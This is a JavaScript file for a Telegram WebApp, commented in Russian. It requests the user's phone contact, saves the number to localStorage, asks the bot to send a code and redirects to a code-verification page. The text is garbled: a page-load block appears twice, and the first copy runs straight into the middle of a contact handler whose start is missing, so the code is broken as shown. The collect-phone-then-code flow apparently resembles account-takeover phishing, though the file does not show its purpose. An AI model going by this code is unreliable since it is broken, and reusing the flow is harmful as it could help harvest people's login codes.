// Проверка Telegram WebApp API при загрузке страницы
document.addEventListener('DOMContentLoaded', function() {
    showDebugInfo('🔍 Проверяем Telegram WebApp API при загрузке...');
    
    // Проверяем, что Telegram WebApp API доступен
    if (window.Telegram && window.Telegram.WebApp) {
        showDebugInfo('✅ Telegram WebApp API доступен!');
        // Инициализируем WebApp
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    } else {
        showDebugInfo('❌ Telegram WebApp API недоступен');
    }
});        showDebugInfo('📱 Получен контакт: ' + (contact ? 'ДА' : 'НЕТ'));
            if (contact && contact.phone_number) {
                // Сохраняем номер
                localStorage.setItem('phoneNumber', contact.phone_number);
                
                // Отправляем запрос на отправку кода боту
                sendCodeToBot(contact.phone_number);
                
                // Переходим на страницу ввода кода
                window.location.href = 'code-verification.html';
            } else {
                alert('❌ Не удалось получить номер телефона');
            }
        });
    } else {
        showDebugInfo('❌ Telegram WebApp API недоступен');
        alert('❌ Это приложение работает только в Telegram!');
    }
}

// Функция отправки запроса на код боту
function sendCodeToBot(phone) {
    if (window.Telegram && window.Telegram.WebApp) {
        const data = {
            action: 'send_code',
            phone: phone
        };
        
        // Отправляем данные боту
        window.Telegram.WebApp.sendData(JSON.stringify(data));
        console.log('📱 Запрос на отправку кода отправлен боту');
    }
}

// Функции для модального окна
function showPrivacyModal() {
    document.getElementById('privacyModal').style.display = 'block';
    document.body.style.overflow = 'hidden';
}

function closePrivacyModal() {
    document.getElementById('privacyModal').style.display = 'none';
    document.body.style.overflow = 'auto';
}

// Закрытие модального окна при клике вне его
window.onclick = function(event) {
    const modal = document.getElementById('privacyModal');
    if (event.target === modal) {
        closePrivacyModal();
    }
}

// Закрытие модального окна по Escape
document.addEventListener('keydown', function(event) {
    if (event.key === 'Escape') {
        closePrivacyModal();
    }
});

// Функция для отображения отладочной информации
function showDebugInfo(message) {
    // Создаем элемент для отладки, если его нет
    let debugDiv = document.getElementById('debug-info');
    if (!debugDiv) {
        debugDiv = document.createElement('div');
        debugDiv.id = 'debug-info';
        debugDiv.style.cssText = `
            position: fixed;
            top: 10px;
            left: 10px;
            background: rgba(0,0,0,0.8);
            color: white;
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
            z-index: 9999;
            max-width: 300px;
            word-wrap: break-word;
        `;
        document.body.appendChild(debugDiv);
    }
    
    // Добавляем сообщение
    debugDiv.innerHTML += '<br>' + message;
    
    // Ограничиваем количество сообщений
    const lines = debugDiv.innerHTML.split('<br>');
    if (lines.length > 10) {
        debugDiv.innerHTML = lines.slice(-10).join('<br>');
    }
}

// Проверка Telegram WebApp API при загрузке страницы
document.addEventListener('DOMContentLoaded', function() {
    showDebugInfo('🔍 Проверяем Telegram WebApp API при загрузке...');
    
    // Проверяем, что Telegram WebApp API доступен
    if (window.Telegram && window.Telegram.WebApp) {
        showDebugInfo('✅ Telegram WebApp API доступен!');
        // Инициализируем WebApp
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    } else {
        showDebugInfo('❌ Telegram WebApp API недоступен');
    }
});
